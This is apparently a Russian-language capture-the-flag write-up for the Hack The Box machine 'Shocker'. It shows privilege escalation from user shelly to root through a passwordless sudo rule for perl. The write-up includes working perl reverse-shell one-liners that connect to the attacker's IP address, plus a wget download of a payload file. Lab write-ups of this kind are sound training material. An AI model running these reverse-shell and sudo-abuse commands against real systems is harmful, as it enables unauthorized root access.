# Shell as Shelly

Теперь мы можем получить флаг пользователя:

![[Pasted image 20210614103814.png]]

## Базовое выделение групп

У нас много групп:

```bash
shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Группа `adm` выделяется, так как обычно означает, что можно читать `/var/log`.

Однако существовала более простая некорректная конфигурация:

```bash
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Мы можем запустить perl с правами root. Так что мы можем настроить скрипт perl, чтобы получить шелл.

[Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) имеет пример perl обратного шелла:

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Я создал файл `rev.cgi` на своем локальном компьютере, согласно [темуле](https://www.lcn.com/support/articles/how-to-create-a-perl-script/):

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ cat rev.cgi 
#!/usr/bin/perl

perl -e 'use Socket;$i="10.10.16.211";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Я передал файл и скачал его в `/tmp`:

```bash
shelly@Shocker:/tmp$ wget 10.10.16.211:8000/rev.cgi
wget 10.10.16.211:8000/rev.cgi
--2021-06-14 05:52:18--  http://10.10.16.211:8000/rev.cgi
Connecting to 10.10.16.211:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 239 [application/octet-stream]
Saving to: 'rev.cgi'

     0K                                                       100% 19.6K=0.01s

2021-06-14 05:52:18 (19.6 KB/s) - 'rev.cgi' saved [239/239]
```

Затем я запустил его согласно [этому](https://stackoverflow.com/questions/17748688/running-perl-script-from-command-line):

```bash
shelly@Shocker:/tmp$ sudo /usr/bin/perl rev.cgi
sudo /usr/bin/perl rev.cgi
syntax error at rev.cgi line 3, near "perl -e "
Execution of rev.cgi aborted due to compilation errors.
```

Он не собирается. Я попробовал запустить его как файл `.pl`:

```bash
shelly@Shocker:/tmp$ mv rev.cgi rev.pl
mv rev.cgi rev.pl
shelly@Shocker:/tmp$ sudo /usr/bin/perl rev.pl
sudo /usr/bin/perl rev.pl
syntax error at rev.pl line 3, near "perl -e "
Execution of rev.pl aborted due to compilation errors.
```

Затем я понял, что полезная нагрузка, которую я скопировал, не была синтаксисом для файла perl — это было просто для встроенного команды perl в bash. Так что мне даже не нужен был файл для выполнения!

Я запустил этот команду вместо этого:

```bash
shelly@Shocker:/tmp$ sudo perl -e 'use Socket;$i="10.10.16.211";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

И получил шелл!

![[Pasted image 20210614105016.png]]

Это и есть компьютер!

![[Pasted image 20210614105225.png]]
